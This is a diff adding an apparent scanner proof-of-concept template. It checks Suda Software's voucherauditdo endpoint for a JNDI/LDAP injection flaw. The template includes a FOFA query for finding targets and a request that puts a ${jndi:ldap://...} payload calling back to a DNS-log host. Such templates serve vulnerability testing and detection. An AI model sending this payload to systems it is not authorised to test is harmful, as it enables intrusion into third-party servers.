@@ -1,0 +1,18 @@
+id: poc-yaml-suda-software-voucherauditdo-jnidi
+info:
+  name: 速达软件 voucherauditdo JNID注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - LDAP注入
+  - 两高一弱
+  finger: 速达软件
+  fofa: body="速达软件技术"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://{{.domain}}}
+  expression: reverse.Verify()
+transport: http
